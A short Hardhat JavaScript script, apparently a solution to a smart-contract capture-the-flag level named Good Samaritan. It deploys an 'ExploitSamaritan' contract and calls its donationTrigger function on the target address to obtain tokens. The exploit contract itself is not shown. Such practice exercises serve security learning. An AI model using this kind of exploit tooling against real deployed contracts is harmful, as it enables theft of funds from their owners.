const { ethers } = require('hardhat');
const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------');

    const accounts = await ethers.getSigners();
    const sender = accounts[0];
    console.log(sender.address)

    const goodSamaritanAddress = addresses[scriptName];

    const ExploitSamaritan = await ethers.getContractFactory('ExploitSamaritan');
    const exploitSamaritan = await ExploitSamaritan.deploy();
    const contract = await exploitSamaritan.deployed();

    const txGetTokens = await contract.donationTrigger(goodSamaritanAddress);
    
    console.log('----------End----------', txGetTokens.hash);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
  